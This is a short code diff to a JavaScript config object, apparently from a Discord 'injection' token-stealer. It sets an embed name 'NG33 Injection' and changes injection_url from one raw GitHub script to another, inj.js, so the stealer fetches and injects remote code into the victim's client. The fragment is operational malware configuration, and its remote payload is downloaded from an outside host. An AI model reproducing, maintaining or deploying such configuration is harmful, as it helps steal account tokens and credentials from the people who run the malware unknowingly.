@@ -14,7 +14,7 @@ const config = {
   embed_name: 'NG33 Injection', 
   embed_icon: 'https://vectorified.com/images/cool-profile-icon-17.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/DARKNOSY/DARKNOSY/main/inj.js', 
   /**
 
    **/
